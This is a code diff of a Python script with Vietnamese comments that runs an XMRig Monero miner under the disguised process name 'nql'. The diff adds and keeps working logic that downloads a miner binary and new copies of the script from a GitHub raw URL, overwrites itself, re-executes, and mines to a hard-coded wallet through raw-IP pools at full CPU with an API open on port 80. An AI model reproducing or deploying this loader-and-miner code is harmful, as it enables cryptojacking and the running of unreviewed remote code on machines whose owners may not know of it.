@@ -18,7 +18,7 @@ elif platform == "win32":
 #if cores <= 0:
 #    cores = 1
 timeout = 30
-thoi_gian_nghi = 28800
+thoi_gian_nghi = 14400
 
 if operate_system == 'lin':
     try:
@@ -34,14 +34,19 @@ if operate_system == 'lin':
         os.system('python3 -m easy_install install pip')
     except:
         pass
+
     try:
         os.system('pip install psutil')
         os.system('pip3 install psutil')
     except:
         pass
 import psutil
+
+xmrig_name = 'nql'
+os.system('pkill %s' % xmrig_name)
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
-command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+#command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+command_xmrig_default = '--algo randomx -o 45.8.146.102:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 #command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
@@ -49,9 +54,16 @@ while True:
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.3
+    version_chinh = 5.7
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
+
+    link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
+    link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
+    
+    gz_name = 'xmrig_linux.gz'
+    folder_xmrig = 'xmrig_linux'
+    xmrig_name = 'nql'
     try:
         response = requests.get(link_version_chinh, timeout=timeout)
         get_version_chinh = float(response.text)
@@ -63,12 +75,14 @@ while True:
                 print('Co version moi, update thoi')
                 response = requests.get(link_dao, timeout=timeout)
                 data_trave = response.text
-                print(data_trave)
-                fileopen = open(path_app, 'w+')
-                fileopen.write(data_trave)
-                fileopen.close()
-                os.system('python3 %s' % path_app)
-                sys.exit()
+                #print(data_trave)
+                if 'command_xmrig_default' in data_trave:
+                    fileopen = open(path_app, 'w+')
+                    fileopen.write(data_trave)
+                    fileopen.close()
+                    os.system('pkill %s' % xmrig_name)
+                    os.system('python3 %s' % path_app)
+                    sys.exit()
     except:
         pass
 
@@ -89,12 +103,7 @@ while True:
         #print('So cores de dao la %s' %cores)
         #xmr
         
-        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
-        link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
-        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
-        gz_name = 'xmrig_linux.gz'
-        folder_xmrig = 'xmrig_linux'
-        xmrig_name = 'nql'
+        
         try:
             if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                 print('Chua co chuong trinh %s' %xmrig_name)
